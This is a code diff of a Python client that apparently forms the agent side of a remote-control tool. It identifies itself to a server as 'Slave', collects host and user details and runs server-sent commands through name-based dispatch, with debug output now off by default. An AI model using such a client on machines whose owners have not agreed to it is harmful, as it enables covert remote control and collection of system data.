@@ -15,8 +15,15 @@ class SlaveClient(Client):
         self.send_bytes(b'Slave')
         if self.recv_bytes() == b'OK':
             if self.debug: print(f"[CLIENT] Server accepted identity")
+            if not self.debug: print(f"[CLIENT] Connected to server")
             return True
         return False
+
+    def execute_command(self, msg):
+        try:
+            getattr(self.commands, msg['command'])(msg)
+        except AttributeError:
+            print(f"[CLIENT] Command {msg['command']} not implemented")
 
     def command_loop(self):
         while True:
@@ -29,20 +36,15 @@ class SlaveClient(Client):
             if not msg: continue
             match msg['type']:
                 case 'command':
-                    match msg['command']:
-                        case 'pc_info':
-                            self.commands.pc_info()
-                        case 'cmd':
-                            self.commands.cmd(msg)
+                    self.execute_command(msg)
 
             print(f'Msg of type {msg["type"]} not implemented.')
-            pprint(msg)
 
 class Commands:
     def __init__(self, slave) -> None:
         self.slave = slave
 
-    def pc_info(self):
+    def pc_info(self, msg):
         msg = {
             "hostname": platform.node(),
             "username": os.getlogin(),
@@ -61,6 +63,6 @@ if __name__ == "__main__":
     from config import Config
     import time
 
-    slave = SlaveClient(addr=Config.SERVER_ADDR, debug=True)
+    slave = SlaveClient(addr=Config.SERVER_ADDR, debug=False)
 
     slave.command_loop()
